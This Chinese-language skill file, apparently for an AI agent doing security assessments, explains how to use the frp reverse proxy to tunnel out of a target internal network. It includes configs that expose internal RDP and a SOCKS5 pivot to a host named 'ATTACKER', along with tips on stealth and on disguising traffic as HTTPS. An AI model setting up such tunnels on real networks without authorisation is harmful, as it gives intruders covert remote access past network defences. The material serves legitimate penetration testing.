---
name: as-frp-tunnel
description: 使用 frp（fast reverse proxy）搭建 TCP/UDP/HTTP/HTTPS 内网穿透。当需要长期稳定的隧道、多协议暴露（web 服务映射到公网域名）、或穿越运营商 NAT 时使用。配置文件驱动，支持 token 认证与 TLS。
---

# frp 内网穿透

frp 是配置文件驱动的反向代理，支持 TCP/UDP/HTTP/HTTPS 多协议暴露、域名绑定与插件体系，适合长周期稳定的隧道场景。项目地址：https://github.com/fatedier/frp

## 核心概念

- **frps**（服务端）：部署在公网 VPS，监听控制端口与承载端口
- **frpc**（客户端）：部署在目标内网机器，把内网服务注册到 frps
- 每个 proxy 是 frpc 配置里的一段 `[[proxies]]`，声明类型、本地地址与远程端口

## 基础用法

### 服务端（公网 VPS）

```ini
# frps.toml
bindPort = 7000
auth.token = "ASSESS_TOKEN"
# 可选：dashboard
webServer.port = 7500
webServer.user = "admin"
webServer.password = "PASS"
```

```bash
./frps -c frps.toml
```

### 客户端（目标内网）——TCP 隧道

```ini
# frpc.toml
serverAddr = "ATTACKER"
serverPort = 7000
auth.token = "ASSESS_TOKEN"

[[proxies]]
name = "rdp"
type = "tcp"
localIP = "10.0.0.2"
localPort = 3389
remotePort = 8389
```

```bash
./frpc -c frpc.toml
# 攻击机访问 ATTACKER:8389 即连到内网 10.0.0.2:3389
```

### SOCKS5 代理（plugin 方式）

```ini
[[proxies]]
name = "socks"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"
```

### HTTP 服务映射（绑定公网端口）

```ini
[[proxies]]
name = "intranet-web"
type = "http"
localPort = 8080
customDomains = ["intranet.assess.example"]
```

需要 frps 配 `vhostHTTPPort`，并把 `intranet.assess.example` 解析到 VPS。

## 稳定性与隐蔽性

- 断线重连：frpc 默认自动重连；`transport.heartbeatInterval` 控制心跳
- TLS 加密：两侧加 `transport.tls.enable = true`，防中间链路明文
- 认证必开：`auth.token`；暴露在公网的 frps 无 token 等于开放端口转发服务
- 用完即拆：评估结束删除 proxy 段并停掉 frpc/frps，不留常驻隧道

## 与 chisel/iox/suo5 的取舍

| 需求 | 选择 |
|------|------|
| 单二进制快速 SOCKS5，HTTP 出站穿透 | chisel / suo5 |
| 多服务长期稳定暴露，配置文件管理 | frp |
| 目标侧只有执行一次的权限，最轻量 | iox |
| 只放行 HTTPS 且需伪装成正常流量 | chisel (TLS) / frp (TLS) |
